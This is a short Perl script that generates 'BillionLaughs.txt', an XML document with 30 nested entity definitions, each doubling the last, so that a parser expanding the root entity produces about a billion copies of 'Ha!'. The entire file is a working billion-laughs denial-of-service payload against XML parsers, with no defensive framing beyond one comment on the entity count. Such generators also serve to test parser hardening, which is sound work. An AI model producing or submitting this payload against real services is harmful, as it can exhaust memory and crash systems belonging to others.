#!/usr/bin/perl
use strict;
use warnings;
use feature qw(say);
#number of entities is 2^30 if $entities = 30
my $entities = 30;
my $i = 1;

open my $OUT, ">", "BillionLaughs.txt" or die "cannot write to BillionLaughs.txt $! \n";
say $OUT "<?xml version=\"1.0\"?>";
say $OUT "<!DOCTYPE root[";
say $OUT "<!ELEMENT root (#PCDATA)>";
say $OUT " <!ENTITY ha0 \"Ha!\">";

for (; $i <= $entities; $i++) {
   printf $OUT " <!ENTITY ha%s \"&ha%s;&ha%s;\" >\n",$i,$i-1,$i-1;
}
say $OUT "]>";
printf $OUT "<root>&ha%s;</root>",$entities;
